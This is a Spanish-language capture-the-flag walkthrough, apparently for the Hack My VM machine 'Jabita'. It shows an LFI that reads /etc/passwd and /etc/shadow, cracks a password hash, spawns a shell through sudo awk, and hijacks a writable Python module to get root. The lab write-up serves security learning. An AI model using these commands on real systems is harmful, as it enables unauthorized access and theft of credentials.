---
layout: post
title: Jabita
date: 2022-11-27
categories: ["HMV", "Enumeration"]
thumbnail: "assets/images/Jabita.png"
---

# Jabita [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.115 -oG allPorts`
- `nmap -sCV -p22,80 192.168.1.115 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Una vez entramos en la página vemos un texto sin relevancia, como no vemos ningún hipervínculo ni comentarios en el código de la página pazaremos a `fuzzear` la página, para ello utilizaremos `WFuzz`, una herramienta hecha en `Python` que nos ayudará en la búsqueda de directorios.
- `wfuzz -u "http://192.168.1.115/FUZZ" -w directory-list-2.3-medium.txt --hc 404`

Tras esperar unos segundos veremos un resultado, `building`. Si inspeccionamos la página veremos que ahora sí hay algo más, arriba vemos tres hipervínculos, los cuales tienen un parámetro que nos llama la atención, `page=`, vamos a ver si es vulnerable a `LFI`.

- `curl http://192.168.1.115/building/index.php?page=/etc/passwd`

```
[...]
root:x:0:0:root:/root:/bin/bash
[...]
jack:x:1001:1001::/home/jack:/bin/bash
jaba:x:1002:1002::/home/jaba:/bin/bash
```

Bien! Vemos que sí es vulnerable! Tras un intento fallido de listar la `id_rsa` de los usuarios `jack` y `jaba` por curiosidad probé con `/etc/shadow`, un archivo el cual (generalmente) está protegido, aunque no es el caso.

```
[...]
jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
```

Además el hash de `root` (el cual no es crackeable) vemos otros dos hashes, el de `jack` y el de `jaba` (tampoco es crackeable), por lo que vamos a copiarnos esa información y con `John` crackear la contraseña de `Jack`.

- `john hash.txt -w=/usr/share/wordlists/rockyou.txt`

Bien! `John` ha sido capaz de crackear al contraseña (`jack:joaninha`)!

### Subida de privilegios #1
Bien, ahora que ya estamos en la máquina por `SSH` tenemos que convertirnos en `jaba` para luego poder convertirnos en `root`, para ello comenzé por hacer `sudo -l`:

```
Matching Defaults entries for jack on jabita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never
 
User jack may run the following commands on jabita:
    (jaba : jaba) NOPASSWD: /usr/bin/awk
```

Como vemos `Jack` puede ejecutar `AWK` como el usuario `Jaba` sin proporcionar contraseña, para poder explotarlo nos vamos a [`GTFObins`](https://gtfobins.github.io/gtfobins/awk/#sudo), el cual nos dice cómo hacerlo.

- `sudo -u jaba awk 'BEGIN {system("/bin/sh")}'`

Estupendo! Ya estamos en la máquina como `Jaba`!

### Subida de privilegios #2
Bien, ahora que ya hemos escalado privilegios ya podemos pasar a ser `root`, para ello vuelvo a ejecutar `sudo -l`.

```
Matching Defaults entries for jaba on jabita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, listpw=never
 
User jaba may run the following commands on jabita:
    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
```

Como vemos podemos ejecutar con `Python` un `script` llamado `clean.py` como `root`. Si lo ejecutamos sólo nos saldrá un simple `Hello`. Por desgracia no podemos escribir en este archivo, pero vemos que está importando un módulo llamado `wild`, vamos a buscarlo:

- `find / -iname wild.py 2>/dev/null`

```
/usr/lib/python3.10/wild.py
```

Vemos que nos ha salido un resultado, si abrimos el archivo veremos lo siguiente:

```Python
def first():
    print("Hello")
```

Vemos que concuerda y además podemos escribir, por lo que podemos hacer que nos otorgue una Shell añadiendo lo siguiente:

```Python
def first():
    print("Hello")
import os
os.system("/bin/bash")
```

Bien! Tras volver a ejecutar el fichero como `root` hemos podido ganar la Shell! Qué fácil!
